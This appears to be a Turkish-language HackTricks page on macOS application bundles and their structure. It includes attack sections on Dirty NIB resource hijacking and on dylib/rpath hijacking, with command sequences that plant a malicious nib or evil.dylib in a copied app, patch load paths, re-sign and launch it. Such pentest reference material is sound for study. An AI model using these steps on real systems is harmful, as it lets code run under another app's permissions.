# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

macOS'taki Bundles; uygulamalar, library'ler ve diğer gerekli dosyalar dahil olmak üzere çeşitli kaynaklar için container görevi görür. Bu sayede Finder'da tanıdık `*.app` dosyaları gibi tek bir nesne olarak görünürler. En sık karşılaşılan bundle, `.app` bundle'ıdır; ancak `.framework`, `.systemextension` ve `.kext` gibi diğer türler de yaygın olarak kullanılır.

### Bir Bundle'ın Temel Bileşenleri

Bir bundle içinde, özellikle `<application>.app/Contents/` directory'si altında, çeşitli önemli kaynaklar bulunur:

- **\_CodeSignature**: Bu directory, uygulamanın bütünlüğünü doğrulamak için gerekli code-signing bilgilerini depolar. Code-signing bilgilerini aşağıdaki gibi command'lerle inceleyebilirsiniz:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Kullanıcı etkileşimi gerçekleştiğinde çalışan uygulamanın executable binary dosyasını içerir.
- **Resources**: Görseller, belgeler ve interface açıklamaları (nib/xib dosyaları) dahil olmak üzere uygulamanın kullanıcı arayüzü bileşenleri için bir depodur.
- **Info.plist**: Uygulamanın ana configuration dosyası olarak görev yapar ve sistemin uygulamayı uygun şekilde tanıması ve onunla etkileşim kurması için kritik öneme sahiptir.

#### Info.plist İçindeki Önemli Key'ler

`Info.plist` dosyası, aşağıdaki key'ler gibi uygulama configuration bilgilerini içerir:

- **CFBundleExecutable**: `Contents/MacOS` dizininde bulunan ana executable dosyasının adını belirtir.
- **CFBundleIdentifier**: Uygulama için global bir identifier sağlar ve macOS tarafından application management için kapsamlı şekilde kullanılır.
- **LSMinimumSystemVersion**: Uygulamanın çalışması için gereken minimum macOS sürümünü belirtir.

### Bundles'ları İnceleme

`Safari.app` gibi bir bundle'ın içeriğini incelemek için şu command kullanılabilir: `bash ls -lR /Applications/Safari.app/Contents`

Bu inceleme, uygulamanın güvenliğini sağlamaktan user interface'ini ve çalışma parametrelerini tanımlamaya kadar farklı amaçlara hizmet eden `_CodeSignature`, `MacOS`, `Resources` gibi dizinleri ve `Info.plist` gibi dosyaları ortaya çıkarır.

#### Additional Bundle Dizinleri

Yaygın dizinlerin yanı sıra bundles'lar şunları da içerebilir:

- **Frameworks**: Uygulama tarafından kullanılan bundled framework'leri içerir. Framework'ler, ekstra resources içeren dylib'ler gibidir.
- **PlugIns**: Uygulamanın yeteneklerini geliştiren plug-in'ler ve extension'lar için bir dizindir.
- **XPCServices**: Uygulama tarafından process dışı iletişim için kullanılan XPC service'lerini barındırır.

Bu yapı, gerekli tüm bileşenlerin bundle içinde kapsüllenmesini sağlayarak modüler ve güvenli bir uygulama ortamını kolaylaştırır.

`Info.plist` key'leri ve anlamları hakkında daha ayrıntılı bilgi için Apple developer documentation kapsamlı resources sunar: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Quarantine uygulanmış bir bundle ilk kez çalıştırıldığında macOS kapsamlı bir signature verification gerçekleştirir ve bundle'ı randomized bir translocated path üzerinden çalıştırabilir. Kabul edildikten sonra sonraki çalıştırmalarda yalnızca shallow checks gerçekleştirilir; `Resources/`, `PlugIns/`, nib'ler vb. içindeki resource dosyaları geçmişte kontrol edilmezdi. macOS 13 Ventura'dan beri ilk çalıştırmada deep check uygulanır ve yeni *App Management* TCC permission'ı, user consent olmadan third-party process'lerin diğer bundles'ları değiştirmesini kısıtlar; ancak eski sistemler savunmasız kalmaya devam eder.
- **Bundle Identifier collisions**: Aynı `CFBundleIdentifier` değerini yeniden kullanan birden fazla embedded target (PlugIns, helper tools), signature validation işlemini bozabilir ve zaman zaman URL-scheme hijacking/confusion'a olanak sağlayabilir. Her zaman sub-bundles'ları enumerate edin ve unique ID'leri doğrulayın.

## Resource Hijacking (Dirty NIB / NIB Injection)

Ventura'dan önce, signed app içindeki UI resources'larını değiştirmek shallow code signing'i bypass edebilir ve uygulamanın entitlements'larıyla code execution sağlayabilirdi. Güncel research (2024), bunun pre-Ventura sistemlerde ve un-quarantined builds'lerde hâlâ çalıştığını gösteriyor:<sup>[[1]](#references)[[2]](#references)</sup>

1. Target app'i writable bir konuma kopyalayın (ör. `/tmp/Victim.app`).
2. `Contents/Resources/MainMenu.nib` dosyasını (veya `NSMainNibFile` içinde belirtilen herhangi bir nib'i), `NSAppleScript`, `NSTask` vb. instantiate eden malicious bir nib ile değiştirin.
3. App'i launch edin. Malicious nib, victim'ın bundle ID'si ve entitlements'ları (TCC grants, microphone/camera vb.) altında çalışır.
4. Ventura+ ilk launch'ta bundle'ı deep-verify ederek ve sonraki modifications işlemleri için *App Management* permission'ı gerektirerek bu durumu azaltır; bu nedenle persistence daha zordur, ancak eski macOS sürümlerindeki initial-launch attacks hâlâ geçerlidir.<sup>[[1]](#references)</sup>

Minimal malicious nib payload örneği (`ibtool` ile xib'i nib'e compile edin):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Bundles içinde Framework / PlugIn / dylib Hijacking

`@rpath` aramaları bundled Frameworks/PlugIns'ı tercih ettiğinden, `Contents/Frameworks/` veya `Contents/PlugIns/` içine malicious bir library bırakmak, ana binary library validation olmadan ya da zayıf `LC_RPATH` sıralamasıyla signed edildiğinde load order'ı yönlendirebilir.

Unsigned/ad-hoc bir bundle'ı abuse ederken tipik adımlar:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notlar:
- `com.apple.security.cs.disable-library-validation` eksik olan Hardened Runtime, üçüncü taraf dylib'leri engeller; önce entitlements'ı kontrol edin.
- `Contents/XPCServices/` altındaki XPC services genellikle kardeş framework'leri yükler—persistence veya privilege escalation yolları için ikili dosyalarını benzer şekilde patch'leyin.

## Hızlı İnceleme Özeti
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referanslar

- [1] [Bringing process injection into view(s): nib files kullanarak macOS uygulamalarını exploit etme (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
